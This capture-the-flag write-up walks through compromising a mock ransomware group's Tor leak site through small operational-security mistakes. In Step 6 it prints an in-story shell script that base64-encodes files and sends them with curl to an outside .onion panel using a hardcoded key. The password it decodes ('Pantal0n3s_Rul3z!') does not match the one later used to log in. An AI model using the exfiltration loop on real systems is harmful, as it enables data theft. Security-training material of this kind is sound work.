# The Sisterhood of the Traveling Packets — Writeup

**Category:** Web / OSINT / Forensics  
**Target:** `b3u42lmdurcyqieiox3o3ns2c2rst6doyyjnwfuirr7bnewt53gke7yd.onion`  
**Date:** 17-19 August 2026  

## Overview

This challenge presents a fake ransomware group's public-facing "leak site," reachable only over Tor. The premise: the group ("pantalones") has been sloppy with OPSEC, and the goal is to chain together small mistakes — an unprotected `robots.txt`, a crew roster, an open directory listing, a leaked internal script, and a token-gated internal API — to eventually recover admin credentials and capture the flag from a hidden admin panel.

The path to the flag was almost entirely a recon and pivoting exercise: each small leak fed into the next step.

## Step 1 — Initial recon

Starting from the root of the site, I checked `robots.txt` first, since it often hints at pages the operators would rather not have indexed:

<img width="742" height="106" alt="1" src="https://github.com/user-attachments/assets/78b53506-fcae-40d2-8a62-bfd2ac91f4f1" />

This immediately told me two things worth investigating existed: `api.php` and `admin.php`. Disallow entries in `robots.txt` are a search-engine convention, not an access control — so both were fair game to visit directly.

## Step 2 — Mapping the site

The public site (`index.php`) is a "leak board" listing supposed ransomware victims with countdown timers to publication. Viewing page source revealed a base64-encoded HTML comment:

```html
<!-- bm90X3RoZV9mbGFnX2tlZXBfbG9va2luZw== -->
```

Decoded, this reads `not_the_flag_keep_looking` — a deliberate red herring from the challenge authors, but it confirmed that hidden HTML comments were a mechanic worth checking on every page going forward.

`crew.php` listed four operator aliases and their roles:

<img width="997" height="544" alt="2" src="https://github.com/user-attachments/assets/e635053d-0140-4d19-bbf7-dce31b9b4c8c" />

`about.php` was mostly flavor text, but reinforced the group's branding ("pantalones") which later turned out to be reused in credentials.

## Step 3 — Probing `admin.php`

Visiting `admin.php` presented a standard username/password login form. Testing revealed the app distinguishes between "user does not exist" and "incorrect password" — a username enumeration flaw:

- `admin` / `admin` → `username 'admin' does not exist`
  <img width="985" height="512" alt="3" src="https://github.com/user-attachments/assets/e822ca27-eaa0-4498-b7e2-d6dfa8c8ff6d" />

- `vex` / `admin` → `incorrect password. we are watching you!`
  <img width="1012" height="548" alt="4" src="https://github.com/user-attachments/assets/522afd41-902e-4c5e-a49f-6545ffb2e7a1" />

Using this oracle, I confirmed all four crew aliases (`vex`, `crypt`, `mora`, `skid`) are valid usernames on the panel. This narrowed the problem from "guess a username and password" to "find the right password for one of four known accounts."

## Step 4 — Probing `api.php`

Visiting `api.php` with no parameters returned a helpful error enumerating the entire action surface:

<img width="704" height="279" alt="5" src="https://github.com/user-attachments/assets/4f26a6f3-1fef-4ccd-bba3-e39aa088f197" />

Walking through each action unauthenticated:

- **`status`** — panel version, uptime, node count, storage stats, and which operators were online (`vex`, `crypt`).
- **`wallets`** — Bitcoin addresses and a rotation pool, total received BTC, mixer status.
- **`payloads`** — staged malware builds per victim (variant, dropper type, EDR bypass flag, build hash).
- **`exfil`** — a log of completed exfiltration jobs per victim with sizes and completion dates.
- **`messages`** — required a `conversation_id` parameter (not yet known).
- **`decrypt`** — required a `victim_id` (example format given: `NXV-2026-041`) and, once supplied, also a `txid` — a 64-character hex blockchain transaction ID.
- **`upload`** — required an `X-Panel-Key` HTTP header, i.e., real authentication.

At this point most of the "read" actions were open, but `messages`, `decrypt`, and `upload` all needed additional information I didn't have yet.

## Step 5 — Open directory listings

The leak board linked directly to `downloads/quantumcore/` and `downloads/aetherflow/` for two victims. Browsing those paths directly (rather than the specific `.zip` links shown on the page) revealed Apache's default directory index was enabled — exposing extra files never linked from the site:

- `downloads/aetherflow/` contained `aetherflow_leak.zip`, plus **`api_keys_internal.yaml`** and `customers.sql`.
  <img width="819" height="366" alt="6" src="https://github.com/user-attachments/assets/c23d2e03-a84c-4fe8-b014-f50d6f961864" />

- `downloads/quantumcore/` contained `quantumcore_leak.zip`, plus `employees.sql`, `financial_summary_q1_2026.sql`, and `internal_comms.csv`.
  <img width="866" height="352" alt="7" src="https://github.com/user-attachments/assets/b064be47-f5c7-42de-8be7-67eb05fbd6de" />


These extra files turned out to be flavor/red-herring content — fake API keys, SQL dumps, and Slack-style chat logs belonging to the *victim* companies, not the ransomware crew itself. They were useful for immersion (and one chat log amusingly referenced the crew's own failed TOR-based intrusion attempt) but didn't advance the actual attack path.

## Step 6 — The real find: a leftover exfil script

The actual leak `.zip` files (`quantumcore_leak.zip` / `aetherflow_leak.zip`) — the files actually advertised as "the leak" on the front page — contained something the directory listing's visible files didn't: a leftover shell script, `exfil.sh`, apparently a **dotfile the crew forgot to strip before publishing the archive**:

```bash
#!/bin/bash
# aetherflow staging dump - vex 05/30
PANEL="http://6562q4ut6lpt6r3s37kxilu2huuou2qia23jzlzmlqqznqv5sfbp2xid.onion/"
KEY="pantalonesgroup"

TARGETS=(
    "route_algorithms_PROPRIETARY.sql"
    "customers.sql"
    "api_keys_internal.yaml"
)

for f in "${TARGETS[@]}"; do
    [ -f "$f" ] || continue
    # dont upload ourselves lol
    [ "$f" = ".exfil.sh" ] && continue
    b64=$(base64 -w0 "$f")
    curl -s -X POST "${PANEL}/api.php?action=upload" \
        -H "X-Panel-Key: ${KEY}" \
        -d "chunk=${b64}&fname=${f}&tag=aetherflow"
    echo "[+] sent: $f"
done

# TODO: delete this before zipping
```

This one file was the pivot point for the rest of the challenge. It leaked:

1. **`X-Panel-Key: pantalonesgroup`** — the API authentication token `api.php`'s protected actions required.
2. A second `.onion` address, apparently the crew's actual internal panel/C2 host — separate from the public leak site. (This address did not resolve reliably during the challenge and turned out to be a dead end / atmosphere rather than part of the intended path.)
3. Attribution — the script's comment ("vex 05/30") tied it to the `vex` account, reinforcing that credential/secret reuse by `vex` specifically was the theme to keep pulling on.

## Step 7 — Authenticating to the API

Since Tor Browser doesn't easily support custom headers and POST bodies for ad-hoc API testing, I switched to `curl` (built into modern Windows) routed through Tor Browser's local SOCKS proxy:

```
curl --socks5-hostname 127.0.0.1:9150 <url> -H "X-Panel-Key: pantalonesgroup"
```

The `--socks5-hostname` flag matters here — it forces `.onion` hostname resolution to happen *through* Tor rather than failing locally.

Testing the leaked key against `api.php?action=upload` confirmed the key was valid (the endpoint itself just responded that remote uploads were disabled by the operator):

```json
{"error":"upload endpoint disabled","detail":"remote upload suspended by operator. use local staging only.","contact":"vex","last_upload":"2026-06-05 22:41","total_staged":"14.2 GB"}
```

## Step 8 — Reading crew messages

With the key in hand, `api.php?action=messages&conversation_id=1` returned real internal chat logs between the crew:

```json
{"status":"ok","data":[
  {"from":"crypt","to":"crew","body":"stratifytech payload is ready. dropper bypasses their EDR..."},
  {"from":"mora","to":"crew","body":"ironic hitting a cybersec company lmao"},
  {"from":"vex","to":"crew","body":"its behind tor who cares. nobody is finding it"},
  {"from":"crypt","to":"crew","body":"someone left the exfil script in the aetherflow zip..."},
  {"from":"vex","to":"crew","body":"shit thats mine. its a dotfile tho so nobody will see it probably"},
  {"from":"crypt","to":"crew","body":"we need to rotate the panel key"},
  {"from":"mora","to":"crew","body":"vex is right its fine. who would even find the .onion address to begin with"}
]}
```

This conversation was effectively a meta-narration confirming the dotfile mistake I'd already found — and a strong hint that more conversation IDs, and more crew carelessness, were waiting to be enumerated.

Incrementing to `conversation_id=2` paid off immediately. Alongside more in-character banter (the crew mocking the "Sisterhood of the Traveling Packets" researchers and bragging about a fresh phishing hit on Lumenisys), `crypt` explicitly told `mora` off for repeatedly asking for her own password in plaintext in the group chat — but then sent it anyway, "encoded" as a token gesture toward OPSEC:

```json
{"from":"mora","to":"crew","body":"hey @crypt whats my password for the FTP server again? i reset my machine and lost it"},
{"from":"crypt","to":"crew","body":"UGFudGFsMG4zc19SdWwzeiE= - thats YOUR password mora. i encoded it this time, figure it out yourself. stop asking me for it every week"},
{"from":"mora","to":"crew","body":"ty. ive been using this password since 2011 and nobody has cracked it yet so i think im good lol"}
```

"Encoding" it did nothing meaningful — it's plain base64, decoded trivially:

```
echo "UGFudGFsMG4zc19SdWwzeiE=" | base64 -d
Pantal0n3s_Rul3z!
```

`crypt` had, ironically, been the one crew member consistently flagging bad security practices throughout the chat logs (calling out the leftover dotfile, telling the crew to change the admin password, telling mora to stop sharing creds in the channel) — and then undermined all of it in the same message by sending the password anyway, just base64-wrapped. `mora`'s own reply ("been using this password since 2011") was the final nail: a decade of password reuse across systems.

## Step 9 — Admin panel access and flag capture

Using the recovered credentials against the earlier-confirmed valid username on `admin.php`:

```
username: mora
password: Pantal0n3s_Rulzz!
```

This authenticated successfully, landing on a full panel dashboard. The flag was displayed directly in the decryption-key field for the "Sisterhood of the Traveling Packets" row.
<img width="900" height="973" alt="8" src="https://github.com/user-attachments/assets/d054be35-e351-4bfc-9aaf-78ab6f3c5edf" />

**Flag:** `flare{pantal0n3s_g0t_pantsed_2026}`

## Root cause / OPSEC failure chain

Every step of this challenge was a realistic, small mistake compounding into a full compromise:

1. **Verbose error messages** on `admin.php` allowed username enumeration (different error for "no such user" vs. "wrong password").
2. **Directory listing enabled** on the downloads folder exposed files never linked from the site.
3. **A secrets-bearing script committed into a public release archive** (`exfil.sh`), including a hardcoded API key and internal infrastructure address.
4. **API key reuse** — a single static bearer token (`X-Panel-Key`) protected multiple sensitive actions with no rotation, despite a crew member explicitly flagging the need to rotate it after the leak was discovered.
5. **Security through obscurity as the only defense** — `vex`'s own words ("its behind tor who cares, nobody is finding it") were the whole security model for `admin.php`.
6. **Credentials shared in plaintext chat**, later exposed via an authenticated-but-otherwise-unaudited internal messaging API endpoint.
7. **Encoding mistaken for encryption** — `crypt` "encoded" mora's password as base64 before sending it in-channel, treating a reversible, trivially-decodable transform as if it were a security control.
8. **Long-term password reuse** — mora acknowledged using the same password "since 2011," meaning this single leak likely compromises far more than just the admin panel.

## Tools used

- Tor Browser
- `curl` 
- Base64 
